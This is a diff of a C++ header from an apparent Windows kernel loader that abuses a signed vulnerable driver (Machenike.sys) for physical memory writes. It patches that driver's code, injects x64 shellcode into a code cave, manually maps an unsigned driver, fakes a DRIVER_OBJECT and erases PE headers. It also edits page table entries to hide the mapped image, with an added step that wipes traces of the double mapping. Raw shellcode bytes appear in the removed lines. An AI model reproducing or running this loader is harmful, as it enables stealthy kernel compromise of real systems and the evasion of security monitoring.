@@ -4,47 +4,47 @@
 #include "manual_map.h"
 
 // ============================================================
-// shellcode_builder.h â åæ ¸ Shellcode æé å¨
+// shellcode_builder.h — 内核 Shellcode 构造器
 //
-// èè´£ï¼
-//   1. æ«æ WHQL é©±å¨ default åæ¯ä½ç½®ï¼ç©çç¹å¾ç æç´¢ï¼
-//   2. å¤ä»½åå§å­è
-//   3. æé  Shellcodeï¼
-//      a. ExAllocatePoolWithTag â åéç®æ éååå­
-//      b. ç©çåå¥ drv_wsk å±å¼éåï¼éè¿ç¨æ·æç¼å²åºç©çå°åï¼
-//      c. æé ä¼ª DRIVER_OBJECT + KLDR_DATA_TABLE_ENTRY
-//      d. æå¥ PsLoadedModuleList
-//      e. è°ç¨ drv_wsk DriverEntry
-//      f. æ¢å¤ WHQL default åæ¯åå§å­è
-//   4. å° Shellcode åå¥ WHQL é©±å¨ default åæ¯ä½ç½®
+// 职责：
+//   1. 扫描 WHQL 驱动 default 分支位置（物理特征码搜索）
+//   2. 备份原始字节
+//   3. 构造 Shellcode：
+//      a. ExAllocatePoolWithTag → 分配目标镜像内存
+//      b. 物理写入 drv_wsk 展开镜像（通过用户态缓冲区物理地址）
+//      c. 构造伪 DRIVER_OBJECT + KLDR_DATA_TABLE_ENTRY
+//      d. 挂入 PsLoadedModuleList
+//      e. 调用 drv_wsk DriverEntry
+//      f. 恢复 WHQL default 分支原始字节
+//   4. 将 Shellcode 写入 WHQL 驱动 default 分支位置
 // ============================================================
 
-// ---- æ«æ WHQL é©±å¨ç default åæ¯ç©çä½ç½® ----
-// ç¹å¾ï¼mov ebx, STATUS_INVALID_PARAMETER (0xC000000D); jmp rel32
-// IDA éåå®æµï¼BB 0D 00 00 C0 E9
+// ---- 扫描 WHQL 驱动的 default 分支物理位置 ----
+// 特征：mov ebx, STATUS_INVALID_PARAMETER (0xC000000D); jmp rel32
+// IDA 逆向实测：BB 0D 00 00 C0 E9
 
 static const uint8_t WHQL_DEFAULT_SIG[] = {
     0xBB, 0x0D, 0x00, 0x00, 0xC0, 0xE9  // mov ebx, 0xC000000D; jmp rel32
 };
 
 struct WhqlPatchSite {
-    uint64_t kernVA;    // WHQL é©±å¨ä»£ç æ®µä¸­çåæ ¸ VA
-    uint64_t physAddr;  // å¯¹åºç©çå°å
-    uint8_t  original[64]; // å¤ä»½åå§å­è
+    uint64_t kernVA;    // WHQL 驱动代码段中的内核 VA
+    uint64_t physAddr;  // 对应物理地址
+    uint8_t  original[64]; // 备份原始字节
 };
 
-// å¨ç©çåå­ç WHQL é©±å¨ä»£ç æ®µèå´åæ«æ default ç¹å¾ç 
+// 在物理内存的 WHQL 驱动代码段范围内扫描 default 特征码
 static bool FindWhqlDefaultBranch(
     HANDLE   hDev,
     uint64_t cr3,
-    uint64_t whqlDrvBase,   // WHQL é©±å¨åæ ¸ VA åºåï¼ä» PsLoadedModuleList è¯»åï¼
-    uint32_t whqlDrvSize,   // é©±å¨éåå¤§å°
+    uint64_t whqlDrvBase,   // WHQL 驱动内核 VA 基址（从 PsLoadedModuleList 读取）
+    uint32_t whqlDrvSize,   // 驱动镜像大小
     WhqlPatchSite& site)
 {
     LOG_INFO("FindWhqlDefaultBranch: scanning WHQL driver 0x%016llX size=0x%X",
              whqlDrvBase, whqlDrvSize);
 
-    // å¨é©±å¨èæå°åç©ºé´åé 4KB é¡µæ«æ
+    // 在驱动虚拟地址空间内逐 4KB 页扫描
     for (uint32_t off = 0; off + 0x1000 <= whqlDrvSize; off += 0x1000) {
         uint64_t pageVA = whqlDrvBase + off;
         uint64_t pagePA = 0;
@@ -69,7 +69,7 @@ static bool FindWhqlDefaultBranch(
     return false;
 }
 
-// ---- ä»æ¬å° ntoskrnl.exe å¯¼åºè¡¨è§£æ PsLoadedModuleList çåæ ¸èæå°å ----
+// ---- 从本地 ntoskrnl.exe 导出表解析 PsLoadedModuleList 的内核虚拟地址 ----
 static uint64_t ResolvePsLoadedModuleList(uint64_t ntoskrnlBase)
 {
     wchar_t sysPath[MAX_PATH] = {};
@@ -101,7 +101,7 @@ static uint64_t ResolvePsLoadedModuleList(uint64_t ntoskrnlBase)
     return psLoadedModuleListVA;
 }
 
-// ---- éè¿ Psapi æä¸¾è®¾å¤é©±å¨ä½ä¸ºå¤ç¨å®ä½æ¹æ¡ ----
+// ---- 通过 Psapi 枚举设备驱动作为备用定位方案 ----
 static bool FindWhqlModuleViaPsapi(
     const wchar_t* targetName,
     uint64_t& outDllBase,
@@ -116,7 +116,7 @@ static bool FindWhqlModuleViaPsapi(
             if (GetDeviceDriverBaseNameW(drivers[i], baseName, MAX_PATH)) {
                 if (_wcsicmp(baseName, targetName) == 0) {
                     outDllBase = (uint64_t)drivers[i];
-                    // è·åæ¬å°é©±å¨æä»¶ç SizeOfImage
+                    // 获取本地驱动文件的 SizeOfImage
                     wchar_t drvPath[MAX_PATH] = {};
                     if (FindWhqlDriverFile(drvPath, MAX_PATH)) {
                         auto raw = ReadFile(drvPath);
@@ -144,20 +144,20 @@ static bool FindWhqlModuleViaPsapi(
     return false;
 }
 
-// ---- æ¥æ¾ WHQL é©±å¨å¨ PsLoadedModuleList ä¸­çæ¡ç® ----
+// ---- 查找 WHQL 驱动在 PsLoadedModuleList 中的条目 ----
 static bool FindWhqlModuleInLdr(
     HANDLE   hDev,
     uint64_t cr3,
-    uint64_t psLoadedModuleList,  // PsLoadedModuleList åæ ¸ VA
-    const wchar_t* targetName,    // å¦ L"Machenike.sys"
+    uint64_t psLoadedModuleList,  // PsLoadedModuleList 内核 VA
+    const wchar_t* targetName,    // 如 L"Machenike.sys"
     uint64_t& outDllBase,
     uint32_t& outSizeOfImage,
-    uint64_t& outLdrEntryVA)      // è¯¥ LDR æ¡ç®çåæ ¸ VAï¼KLDR_DATA_TABLE_ENTRY*ï¼
+    uint64_t& outLdrEntryVA)      // 该 LDR 条目的内核 VA（KLDR_DATA_TABLE_ENTRY*）
 {
     if (psLoadedModuleList == 0) return false;
     uint64_t head = psLoadedModuleList;
     uint64_t cur  = 0;
-    // è¯»åé¾è¡¨å¤´ç Flink
+    // 读取链表头的 Flink
     if (!ReadKernelVA(hDev, cr3, head, &cur, 8)) return false;
 
     int limit = 512;
@@ -175,7 +175,7 @@ static bool FindWhqlModuleInLdr(
             if (_wcsicmp(nameBuf.data(), targetName) == 0) {
                 outDllBase     = entry.DllBase;
                 outSizeOfImage = entry.SizeOfImage;
-                outLdrEntryVA  = cur; // cur = KLDR_DATA_TABLE_ENTRY åæ ¸ VAï¼InLoadOrderLinks å¨åç§» 0ï¼
+                outLdrEntryVA  = cur; // cur = KLDR_DATA_TABLE_ENTRY 内核 VA（InLoadOrderLinks 在偏移 0）
                 LOG_OK("FindWhqlModuleInLdr: found %ls base=0x%016llX size=0x%X LdrEntry=0x%016llX",
                        targetName, outDllBase, outSizeOfImage, outLdrEntryVA);
                 return true;
@@ -188,72 +188,31 @@ static bool FindWhqlModuleInLdr(
 }
 
 // ================================================================
-// Shellcode æ°æ®ç»æï¼æ¹æ¡ C ç´§åå®æ´çï¼72 å­è = 0x48ï¼
-// è¿é¨åæ°æ®é Shellcode ä¸èµ·åå¥ Code Caveï¼ç± Shellcode è¿è¡æ¶è¯»å
+// Shellcode 数据结构（方案 C 紧凑完整版，72 字节 = 0x48）
+// 这部分数据随 Shellcode 一起写入 Code Cave，由 Shellcode 运行时读取
 // ================================================================
 #pragma pack(push, 1)
 struct ShellcodeParams {
-    uint64_t pfnExAllocatePoolWithTag;    // 0x00 ntoskrnl å¯¼åº
+    uint64_t pfnExAllocatePoolWithTag;    // 0x00 ntoskrnl 导出
     uint64_t pfnIofCompleteRequest;       // 0x08 ntoskrnl 导出 IofCompleteRequest (自闭环完成 IRP)
     uint64_t pfnMmCopyMemory;             // 0x10
-    uint64_t userImageVA;                 // 0x18 ç¨æ·æå±å¼éåçèæå°å
+    uint64_t userImageVA;                 // 0x18 用户态展开镜像的虚拟地址
     uint32_t imageSize;                   // 0x20 SizeOfImage
-    uint32_t entryPointOffset;            // 0x24 DriverEntry ç¸å¯¹äºéååºåçåç§»
-    uint32_t relocDirRVA;                 // 0x28 BaseRelocation ç®å½ RVA
-    uint32_t relocDirSize;                // 0x2C BaseRelocation ç®å½å¤§å°
-    uint64_t originalImageBase;           // 0x30 PE OptionalHeader ä¸­çåå§ ImageBase
-    volatile uint32_t completed;          // 0x38 Shellcode æ§è¡å®ææ å¿ï¼ä¿çå¤ç¨ï¼
-    uint32_t status;                      // 0x3C NT STATUS æ§è¡ç»æ
-    uint64_t allocatedPoolVA;             // 0x40 åæ ¸æ± åºåï¼ExAllocatePoolWithTag è¿åï¼
-    uint64_t hookReturnVA;                // 0x48 è·³å WHQL å®¿ä¸»é©±å¨ç°åº (site.kernVA + 5)
-    uint64_t whqlDrvBase;                 // 0x50 å®¿ä¸»é©±å¨ (Machenike.sys) åæ ¸ VA â fakeDriverObj.DriverStart
-    uint32_t whqlDrvSize;                 // 0x58 å®¿ä¸»é©±å¨ SizeOfImage â fakeDriverObj.DriverSize
-    uint64_t whqlLdrEntryVA;              // 0x5C å®¿ä¸» KLDR_DATA_TABLE_ENTRY åæ ¸ VA â fakeDriverObj.DriverSection
-    DRV_BOOT_CONFIG bootConfig;           // 0x64 (20 å­è) Loader æ³¨å¥ç» DriverEntry çå¯å¨åæ°
+    uint32_t entryPointOffset;            // 0x24 DriverEntry 相对于镜像基址的偏移
+    uint32_t relocDirRVA;                 // 0x28 BaseRelocation 目录 RVA
+    uint32_t relocDirSize;                // 0x2C BaseRelocation 目录大小
+    uint64_t originalImageBase;           // 0x30 PE OptionalHeader 中的原始 ImageBase
+    volatile uint32_t completed;          // 0x38 Shellcode 执行完成标志（保留备用）
+    uint32_t status;                      // 0x3C NT STATUS 执行结果
+    uint64_t allocatedPoolVA;             // 0x40 内核池基址（ExAllocatePoolWithTag 返回）
+    uint64_t hookReturnVA;                // 0x48 跳回 WHQL 宿主驱动现场 (site.kernVA + 5)
+    uint64_t whqlDrvBase;                 // 0x50 宿主驱动 (Machenike.sys) 内核 VA → fakeDriverObj.DriverStart
+    uint32_t whqlDrvSize;                 // 0x58 宿主驱动 SizeOfImage → fakeDriverObj.DriverSize
+    uint64_t whqlLdrEntryVA;              // 0x5C 宿主 KLDR_DATA_TABLE_ENTRY 内核 VA → fakeDriverObj.DriverSection
+    DRV_BOOT_CONFIG bootConfig;           // 0x64 (20 字节) Loader 注入给 DriverEntry 的启动参数
 };
 #pragma pack(pop)
 static_assert(sizeof(ShellcodeParams) == 120, "ShellcodeParams size must be exactly 120 bytes (0x78)");
-
-// ================================================================
-// æ¹æ¡ C Shellcode æºå¨ç ï¼x64ï¼323 å­èï¼
-// ç¹æ§ï¼
-//   1. call/pop ç¸å¯¹å¯»åå®ä½ç´§é»å¨åé¢ç 120 å­è ShellcodeParams
-//   2. ExAllocatePoolWithTag(NonPagedPool=0, ImageSize+0x200) åéåæ ¸åå­
-//      é¢å¤ 0x200 å­èç¨äºå¨ Pool å°¾é¨æé å¸¸é©»ä¼ª DRIVER_OBJECT
-//   3. MmCopyMemory(MM_COPY_MEMORY_VIRTUAL=2) ä»è°ç¨è¿ç¨ä¸ä¸æç´æ¥èææ·è´éå
-//   4. å®æ´éå PE .reloc ç®å½ï¼èªå¨ä¿®å¤ææ IMAGE_REL_BASED_DIR64 éå®ä½é¡¹
-//   5. æé  fakeDriverObjï¼
-//      - Type=4, Size=0x150ï¼æ»¡è¶³ ObReferenceObjectByHandle æ ¡éªï¼
-//      - DeviceObject(+0x008) = Pool åºå
-//      - DriverStart/Section æå Machenike.sys/tcpip.sys
-//   6. è°ç¨ DriverEntry(fakeDriverObj, &BootConfig) ââ rdx ä¼ åä¼ å¥åæ ¸å¯å¨åæ°
-//   7. jmp r11 å¹³ç¨³è·³åå®¿ä¸»ç°åº (site.kernVA + 5) æ­£å¸¸å®æ IRP è¿å
-// ================================================================
-static const uint8_t scBytes[] = {
-    0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5B, 0x49, 0x83, 0xEB, 0x7D, 0x53, 0x56, 0x57, 0x41, 0x54,
-    0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x38, 0x49, 0x8B, 0xDB, 0x33, 0xC9, 0x8B,
-    0x53, 0x20, 0x81, 0xC2, 0x00, 0x02, 0x00, 0x00, 0x41, 0xB8, 0x4D, 0x6D, 0x53, 0x74, 0xFF, 0x13,
-    0x48, 0x85, 0xC0, 0x0F, 0x84, 0x08, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0xE0, 0x49, 0x8B, 0xCC, 0x48,
-    0x8B, 0x53, 0x18, 0x44, 0x8B, 0x43, 0x20, 0x41, 0xB9, 0x02, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x44,
-    0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x20, 0xFF, 0x53, 0x10, 0x85, 0xC0, 0x0F, 0x85, 0xCB, 0x00,
-    0x00, 0x00, 0x4D, 0x8B, 0xEC, 0x4C, 0x2B, 0x6B, 0x30, 0x74, 0x5E, 0x83, 0x7B, 0x2C, 0x00, 0x74,
-    0x58, 0x48, 0x63, 0x43, 0x28, 0x4D, 0x8D, 0x34, 0x04, 0x48, 0x63, 0x43, 0x2C, 0x4D, 0x8D, 0x3C,
-    0x06, 0x4D, 0x3B, 0xF7, 0x73, 0x43, 0x41, 0x8B, 0x16, 0x85, 0xD2, 0x74, 0x3C, 0x41, 0x8B, 0x4E,
-    0x04, 0x85, 0xC9, 0x74, 0x34, 0x83, 0xE9, 0x08, 0xD1, 0xE9, 0x74, 0x24, 0x49, 0x8D, 0x76, 0x08,
-    0x0F, 0xB7, 0x06, 0x8B, 0xF8, 0xC1, 0xEF, 0x0C, 0x83, 0xFF, 0x0A, 0x75, 0x0B, 0x25, 0xFF, 0x0F,
-    0x00, 0x00, 0x03, 0xC2, 0x4D, 0x01, 0x2C, 0x04, 0x48, 0x83, 0xC6, 0x02, 0xFF, 0xC9, 0x75, 0xE0,
-    0x41, 0x8B, 0x46, 0x04, 0x4C, 0x03, 0xF0, 0xEB, 0xB8, 0x48, 0x63, 0x7B, 0x20, 0x49, 0x8D, 0x3C,
-    0x3C, 0x57, 0x33, 0xC0, 0xB9, 0x00, 0x02, 0x00, 0x00, 0xF3, 0xAA, 0x5F, 0x66, 0xC7, 0x07, 0x04,
-    0x00, 0x66, 0xC7, 0x47, 0x02, 0x50, 0x01, 0x4C, 0x89, 0x67, 0x08, 0x48, 0x8B, 0x43, 0x50, 0x48,
-    0x89, 0x47, 0x18, 0x8B, 0x43, 0x58, 0x89, 0x47, 0x20, 0x48, 0x8B, 0x43, 0x5C, 0x48, 0x89, 0x47,
-    0x28, 0x48, 0x8B, 0xCF, 0x48, 0x8D, 0x53, 0x64, 0x49, 0x8B, 0xC4, 0x4C, 0x63, 0x43, 0x24, 0x49,
-    0x03, 0xC0, 0xFF, 0xD0, 0x85, 0xC0, 0x78, 0x12, 0x57, 0x49, 0x8B, 0xFC, 0x33, 0xC0, 0xB9, 0x00,
-    0x10, 0x00, 0x00, 0xF3, 0xAA, 0x5F, 0x33, 0xC0, 0xEB, 0x1D, 0x8B, 0xF0, 0xEB, 0x05, 0xBE, 0x01,
-    0x00, 0x00, 0xC0, 0x49, 0x8B, 0xCC, 0xBA, 0x4D, 0x6D, 0x53, 0x74, 0xFF, 0x53, 0x08, 0x8B, 0xC6,
-    0xEB, 0x05, 0xB8, 0x17, 0x00, 0x00, 0xC0, 0x4C, 0x8B, 0x5B, 0x48, 0x48, 0x83, 0xC4, 0x38, 0x41,
-    0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0x8B, 0xD8, 0x41, 0xFF, 0xE3
-};
-static const size_t scBytes_size = sizeof(scBytes);
 
 // ================================================================
 // 微型内存分配探针 Shellcode（x64，66 字节）
@@ -362,11 +321,11 @@ static const uint8_t scDirectExec[] = {
 };
 static const size_t scDirectExec_size = sizeof(scDirectExec);
 
-// æ¥æ¾é©±å¨ä»£ç æ®µä¸­çå®å¨ç©ºæ´ (Code Cave)
+// 查找驱动代码段中的安全空洞 (Code Cave)
 static uint64_t FindWhqlCodeCaveVA(HANDLE hDev, uint64_t cr3, uint64_t whqlDrvBase, size_t neededSize)
 {
-    // IDA éåå®æµï¼Machenike.sys ç .text æ®µæ«å°¾å¨ 0x140002831 ~ 0x140002A00
-    // æ 463 å­èçè¿ç»­ 0x00 å¡«åç©ºé´ï¼åç§» 0x2840ï¼
+    // IDA 逆向实测：Machenike.sys 的 .text 段末尾在 0x140002831 ~ 0x140002A00
+    // 有 463 字节的连续 0x00 填充空间（偏移 0x2840）
     uint64_t candidateVA = whqlDrvBase + 0x2840;
     std::vector<uint8_t> buf(neededSize, 0);
     if (ReadKernelVA(hDev, cr3, candidateVA, buf.data(), neededSize)) {
@@ -392,16 +351,16 @@ struct InjectContext {
     uint64_t       cr3;
     uint64_t       ntoskrnlBase;
     uint64_t       psLoadedModuleList;
-    uint64_t       whqlDrvBase;      // å®¿ä¸»é©±å¨åæ ¸ VA â fakeDriverObj.DriverStart
-    uint32_t       whqlDrvSize;      // å®¿ä¸»é©±å¨ SizeOfImage â fakeDriverObj.DriverSize
-    uint64_t       whqlLdrEntryVA;   // å®¿ä¸» KLDR_DATA_TABLE_ENTRY åæ ¸ VA â fakeDriverObj.DriverSection
+    uint64_t       whqlDrvBase;      // 宿主驱动内核 VA → fakeDriverObj.DriverStart
+    uint32_t       whqlDrvSize;      // 宿主驱动 SizeOfImage → fakeDriverObj.DriverSize
+    uint64_t       whqlLdrEntryVA;   // 宿主 KLDR_DATA_TABLE_ENTRY 内核 VA → fakeDriverObj.DriverSection
     MappedImage*   pImg;
-    uint64_t       userImageVA;      // ç¨æ·æå±å¼éåçèæå°å
-    uint64_t       hookReturnVA;     // è·³åå®¿ä¸»é©±å¨ç°åº (site.kernVA + 5)
-    DRV_BOOT_CONFIG bootConfig;      // æ³¨å¥ç» DriverEntry çå¯å¨åæ°
+    uint64_t       userImageVA;      // 用户态展开镜像的虚拟地址
+    uint64_t       hookReturnVA;     // 跳回宿主驱动现场 (site.kernVA + 5)
+    DRV_BOOT_CONFIG bootConfig;      // 注入给 DriverEntry 的启动参数
 };
 
-// æ­¥éª¤ 1ï¼è§£æ Shellcode æéçææåæ ¸å½æ°å°å
+// 步骤 1：解析 Shellcode 所需的所有内核函数地址
 static bool BuildShellcodeParams(const InjectContext& ctx,
                                   ShellcodeParams& params)
 {
@@ -443,83 +402,86 @@ static bool BuildShellcodeParams(const InjectContext& ctx,
 }
 
 // ================================================================
-// ================================================================
-// 基于 KUSER_SHARED_DATA 保留字段的重复加载检测机制
-//
-// 彻底放弃对宿主驱动 PE 头部（DOS 0x28 等）的修改与检查，
-// 直接利用 Windows 全局共享数据页 KUSER_SHARED_DATA (0x7FFE0000 / 0xFFFFF78000000000)
-// 偏移 0x800 的系统绝对空闲保留区，实现隐蔽跨环防重复加载判断。
-// ================================================================
-static bool CheckDriverCanary(HANDLE hDev, uint64_t cr3, uint64_t /*drvBase*/, uint32_t /*drvOrigSize*/, const wchar_t* drvName)
+static bool CheckDriverCanary(HANDLE hDev, uint64_t cr3, uint64_t drvBase, uint32_t drvOrigSize, const wchar_t* drvName)
 {
+    if (!drvBase) return false;
     DRV_WSK_CANARY canary = {};
-    bool canaryFound = false;
 
-    // 1. 优先通过 R3 内存直接常数级读取 KUSER_SHARED_DATA (0x7FFE0000 + 0x800)
-    __try {
-        const uint8_t* pSharedData = (const uint8_t*)KUSER_SHARED_DATA_R3_VA;
-        const DRV_WSK_CANARY* pCanary = (const DRV_WSK_CANARY*)(pSharedData + KUSER_SHARED_DATA_CANARY_OFF);
-        if (pCanary->Magic == DRV_WSK_CANARY_MAGIC) {
-            canary = *pCanary;
-            canaryFound = true;
-        }
-    } __except (EXCEPTION_EXECUTE_HANDLER) {
-        canaryFound = false;
-    }
-
-    // 2. 备用保护：若 R3 直接读取未命中或发生异常，通过内核原语从内核 VA (0xFFFFF78000000800) 校验
-    if (!canaryFound && hDev && cr3 != 0) {
-        if (ReadKernelVA(hDev, cr3, KUSER_SHARED_DATA_R0_VA + KUSER_SHARED_DATA_CANARY_OFF, &canary, sizeof(canary))) {
+    // 1. 优先检查合法空闲对齐区 (drvBase + drvOrigSize)
+    if (drvOrigSize > 0) {
+        if (ReadKernelVA(hDev, cr3, drvBase + drvOrigSize, &canary, sizeof(canary))) {
             if (canary.Magic == DRV_WSK_CANARY_MAGIC) {
-                canaryFound = true;
+                LOG_OK("================================================================");
+                LOG_OK("[+] Core driver (drv_wsk) CANARY FOUND in host '%ls' extension area (offset +0x%X)!", drvName, drvOrigSize);
+                LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
+                       canary.KernelImageVA, canary.ImageSize);
+                LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
+                LOG_OK("================================================================");
+                return true;
             }
         }
     }
 
-    if (canaryFound) {
-        LOG_OK("================================================================");
-        LOG_OK("[+] Core driver (drv_wsk) CANARY FOUND in KUSER_SHARED_DATA (Offset 0x%llX)!", KUSER_SHARED_DATA_CANARY_OFF);
-        LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
-               canary.KernelImageVA, canary.ImageSize);
-        LOG_OK("[+] Zero-PE modification: Host driver '%ls' PE header completely untouched!", drvName ? drvName : L"host");
-        LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
-        LOG_OK("================================================================");
-        return true;
+    // 2. 兼容检查 DOS 保留区偏移 0x28
+    if (ReadKernelVA(hDev, cr3, drvBase + 0x28, &canary, sizeof(canary))) {
+        if (canary.Magic == DRV_WSK_CANARY_MAGIC) {
+            LOG_OK("================================================================");
+            LOG_OK("[+] Core driver (drv_wsk) CANARY FOUND in host '%ls' (offset 0x28)!", drvName);
+            LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
+                   canary.KernelImageVA, canary.ImageSize);
+            LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
+            LOG_OK("================================================================");
+            return true;
+        }
     }
+
+    // 3. 检查 KUSER_SHARED_DATA 保留区暗桩
+#ifdef KUSER_SHARED_DATA_R0_VA
+    if (ReadKernelVA(hDev, cr3, KUSER_SHARED_DATA_R0_VA + KUSER_SHARED_DATA_CANARY_OFF, &canary, sizeof(canary))) {
+        if (canary.Magic == DRV_WSK_CANARY_MAGIC) {
+            LOG_OK("================================================================");
+            LOG_OK("[+] Core driver (drv_wsk) CANARY FOUND in KUSER_SHARED_DATA (offset 0x%llX)!", KUSER_SHARED_DATA_CANARY_OFF);
+            LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
+                   canary.KernelImageVA, canary.ImageSize);
+            LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
+            LOG_OK("================================================================");
+            return true;
+        }
+    }
+#endif
 
     return false;
 }
 
-static bool ClearDriverCanary(HANDLE hDev, uint64_t cr3)
+static inline bool ClearDriverCanary(HANDLE hDev, uint64_t cr3, uint64_t drvBase = 0)
 {
     DRV_WSK_CANARY zeroCanary = {};
-    return WriteKernelVA(hDev, cr3, KUSER_SHARED_DATA_R0_VA + KUSER_SHARED_DATA_CANARY_OFF, &zeroCanary, sizeof(zeroCanary));
+    bool ok = true;
+    if (drvBase) {
+        ok = WriteKernelVA(hDev, cr3, drvBase + 0x28, &zeroCanary, sizeof(zeroCanary));
+    }
+#ifdef KUSER_SHARED_DATA_R0_VA
+    WriteKernelVA(hDev, cr3, KUSER_SHARED_DATA_R0_VA + KUSER_SHARED_DATA_CANARY_OFF, &zeroCanary, sizeof(zeroCanary));
+#endif
+    return ok;
 }
 
 // ================================================================
-// ä¸»å¥å£ï¼LoadDrvWsk
+// 主入口：LoadDrvWsk
 //
-// å®æ´å è½½æµç¨ï¼
-//   1. æå¼ WHQL è®¾å¤å¥æ
-//   2. è·å CR3 / KernBase / PsLoadedModuleList
-//   3. æ£æ¥åæ ¸ç©çææ¡©ï¼æ¹æ¡ 1ï¼é¿åéå¤å è½½ï¼
-//   4. æ«æ default åæ¯ç¹å¾ç 
-//   5. è¯»åå¹¶å±å¼ drv_wsk.sys PE éåï¼manual mapï¼
-//   6. ä¿®å¤éå®ä½ + IAT
-//   7. æ¹é¤ PE å¤´
-//   8. éå®ç¨æ·æå±å¼éåé¡µå¹¶è·åç©çå°å
-//   9. æå»º ShellcodeParams å¹¶æ³¨å¥ Code Cave
-//  10. è§¦å default åæ¯æ§è¡
-//  11. æ¢å¤ WHQL default åæ¯å¹¶åå¥åæ ¸ææ¡©æ è®°
+// 完整加载流程：
+//   1. 打开 WHQL 设备句柄
+//   2. 获取 CR3 / KernBase / PsLoadedModuleList
+//   3. 检查内核物理暗桩（方案 1，避免重复加载）
+//   4. 扫描 default 分支特征码
+//   5. 读取并展开 drv_wsk.sys PE 镜像（manual map）
+//   6. 修复重定位 + IAT
+//   7. 抹除 PE 头
+//   8. 锁定用户态展开镜像页并获取物理地址
+//   9. 构建 ShellcodeParams 并注入 Code Cave
+//  10. 触发 default 分支执行
+//  11. 恢复 WHQL default 分支并写入内核暗桩标记
 // ================================================================
-#pragma pack(push, 1)
-typedef struct _RUNTIME_FUNCTION_K {
-    uint32_t BeginAddress;
-    uint32_t EndAddress;
-    uint32_t UnwindInfoAddress;
-} RUNTIME_FUNCTION_K;
-#pragma pack(pop)
-
 // 完整注入 Shellcode：将 ShellcodeParams 写入 Code Cave，并将 default 分支转向 Code Cave
 static bool InjectShellcodeFull(
     HANDLE               hDev,
@@ -527,11 +489,11 @@ static bool InjectShellcodeFull(
     const WhqlPatchSite& site,
     uint64_t             caveVA,
     const ShellcodeParams& params,
-    const uint8_t*       pScCode = nullptr,
-    size_t               scCodeSize = 0)
+    const uint8_t*       pScCode = scDirectExec,
+    size_t               scCodeSize = scDirectExec_size)
 {
-    const uint8_t* sc = (pScCode && scCodeSize) ? pScCode : scBytes;
-    size_t scSz       = (pScCode && scCodeSize) ? scCodeSize : scBytes_size;
+    const uint8_t* sc = (pScCode && scCodeSize) ? pScCode : scDirectExec;
+    size_t scSz       = (pScCode && scCodeSize) ? scCodeSize : scDirectExec_size;
 
     // 0. 确保 Code Cave 虚拟页具备内核可写权限（PTE.RW = 1），防止 Shellcode 写回状态时触发 0xBE 蓝屏
     EnsureKernelPageWritable(hDev, cr3, caveVA);
@@ -720,6 +682,8 @@ static uint64_t AllocKernelPoolViaWhql(
     const WhqlPatchSite& site, uint64_t caveVA,
     uint64_t ntoskrnlBase, uint32_t neededBytes)
 {
+    (void)triggerDrvBase;
+    (void)triggerDrvSize;
     InjectContext ctx = {};
     ctx.hDev         = hDev;
     ctx.cr3          = cr3;
@@ -836,6 +800,16 @@ static bool PteRemapHostDriver(
 
         LOG_INFO("  [PTE Remap #%02u] TargetVA=0x%016llX -> PA=0x%016llX (PTE @ 0x%016llX, Old=0x%016llX, New=0x%016llX)",
                  i, curTargetVA, poolPA, ptePA, oldPte, newPte);
+
+        // 方案 3：切断双重映射 (Ghost Pool / Unlink Double Mapping)
+        // 将原 Pool VA 对应的 PTE 清零解绑，彻底消除同一个 PFN 同时挂在非分页池和宿主驱动中的痕迹
+        uint64_t poolPtePA = 0, poolOldPte = 0;
+        if (GetPtePhysAddr(hDev, cr3, curPoolVA, &poolPtePA, &poolOldPte)) {
+            uint64_t zeroPte = 0;
+            WhqlWritePhys(hDev, poolPtePA, &zeroPte, sizeof(zeroPte));
+            LOG_INFO("  [Ghost Pool] Unlinked source PoolVA=0x%016llX PTE (PA=0x%016llX, OldPTE=0x%016llX)",
+                     curPoolVA, poolPtePA, poolOldPte);
+        }
     }
 
     if (!ArePagesPresent(hDev, cr3, hostDrvBase + targetRVA, totalBytes)) {
@@ -848,13 +822,13 @@ static bool PteRemapHostDriver(
 }
 
 // ================================================================
-// InjectPayloadAndPdataIntoHost
+// InjectPayloadIntoHost (新方案：纯 Flat 架构 / 零 PE 头侵入)
 //
-// 将 drv_wsk 整个镜像（≈92KB）和合并 .pdata（≈1.4KB）全部写入
-// 宿主驱动（tcpip.sys）内部原生空闲区域，不超出 SizeOfImage。
+// 将 drv_wsk 镜像写入宿主驱动内部原生空闲区域或 Discardable / INIT / .reloc 节，
+// 不超出 SizeOfImage，完全不修改宿主 PE 头与异常目录。
 // 若无现成常驻物理空洞，自动激活方案 A：通过微型探针分配 NonPagedPool 并完成 PTE Remap。
 // ================================================================
-static bool InjectPayloadAndPdataIntoHost(
+static bool InjectPayloadIntoHost(
     HANDLE         hDev,
     uint64_t       cr3,
     uint64_t       hostDrvBase,
@@ -862,78 +836,57 @@ static bool InjectPayloadAndPdataIntoHost(
     uint64_t       hostLdrEntryVA,
     const wchar_t* hostDrvName,
     MappedImage&   payloadImg,          // 非 const：写入后更新 KernelBase
-    uint32_t&      outNewSize,
-    std::vector<uint8_t>& outCleanDiskHdr,
     uint64_t&      outPayloadKernVA,    // [out] payload 落点内核 VA
-    uint32_t&      outPdataRVA,         // [out] 合并 pdata 落点 RVA（相对 hostDrvBase）
-    uint32_t&      outPdataTotalSize,   // [out] 合并 pdata 总字节数
     uint64_t       ntoskrnlBase = 0,
     uint64_t       triggerDrvBase = 0,
     uint32_t       triggerDrvSize = 0,
     const WhqlPatchSite* pSite = nullptr,
     uint64_t       caveVA = 0)
 {
-    outNewSize        = hostOrigSize;
-    outPayloadKernVA  = 0;
-    outPdataRVA       = 0;
-    outPdataTotalSize = 0;
+    (void)hostLdrEntryVA;
